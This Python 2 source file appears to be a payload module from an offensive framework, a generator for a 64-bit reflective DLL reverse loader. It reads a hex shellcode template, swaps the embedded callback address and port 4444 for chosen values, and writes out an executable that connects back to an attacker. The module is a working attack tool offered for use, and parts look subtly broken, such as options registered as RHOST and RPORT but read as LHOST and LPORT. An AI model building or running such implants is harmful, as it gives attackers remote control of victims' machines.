#! /usr/bin/env python
# -*- coding: utf-8 -*-
#x86


from lib.ple.tools.lib.payloads.payload import * 



class Payload(BGExploit):
        
    def __init__(self):
        super(self.__class__, self).__init__()
        
        self.register_info({
            "Info":{
                "Name":"reflective_reverse_loader_x64",
                "Author":"Mosin",
                "Type":"Reverse",
                "Ref":"----",
                "Version":"1.0",
                "Desc":"This is Reverse ReflectiveLoader.You can customize the DLL, \n"+
                "through the remote loading,But before that, need to deal with the DLL"
            }
        })
        
        #自定义显示参数
        self.register_option({
            "RHOST": {
                "default": "127.0.0.1",
                "desc": "目标IP",
                "Required":"no"
            },
            "RPORT": {
                "default": "4444",
                "desc": "目标端口",
                "Required":"no"
            },
            "FILEPATH": {
                "default": "/test.exe",
                "desc": "保存文件的路径名",
                "Required":"no"
            }
        })

    #获取需要改变的ip
    def get_ex(self,file_data, ex_ip,ex_port):
        self_ip = "3132372e302e302e31"
        self_port = "34343434"
        ex_data = ""
        if file_data.find(self_ip):
            ex_ip_len = file_data.find(self_ip)
            ex_ip_data = file_data[ex_ip_len:ex_ip_len + len(ex_ip)]
            ex_data = file_data.replace(ex_ip_data,ex_ip)
        if ex_data.find(self_port):
            ex_port_len = ex_data.find(self_port)
            ex_port_data = ex_data[ex_port_len:ex_port_len + len(ex_port)]
            ex_data = ex_data.replace(ex_port_data,ex_port)
        return ex_data

    #转十六进制
    def cover(self,ex_ip,ex_port):
        port_tmp = ""
        ip_tmp = ""
        for i in ex_port:
            tmp = i.encode('hex')
            port_tmp += tmp
        for j in ex_ip:
            tmp = j.encode('hex')
            ip_tmp += tmp
        return ip_tmp,port_tmp

    #写出文件
    def write_exe(self,file_data,path_name):
        print u"[+] 保存中..."
        try:
            ex_datas = file_data.decode("hex")
            ff = open(path_name,'wb')
            ff.write(ex_datas)
            ff.close()
            print u"[+] 文件保存路径在" + path_name
        except:
            print u"[-] 文件保存失败!请检查路径或参数"

    #打开文件
    def open_file(self):
        try:
            f = open('lib/soure/data/win_reflective_dll_loader_x64.shell','r')
            file_data = f.read()
        except:
            print "[-] TempleteFile Open Fail"
        return file_data
        
    def payload(self):
        ex_ip = self.options.LHOST['default']
        ex_port = self.options.LPORT['default']
        path_name = self.options.FILEPATH['default']
        ex_ip,ex_port = self.cover(ex_ip,ex_port)
        print u"[+] 正在转换..."
        file_data = self.open_file()
        get_data = self.get_ex(file_data, ex_ip, ex_port)
        self.write_exe(get_data,path_name)
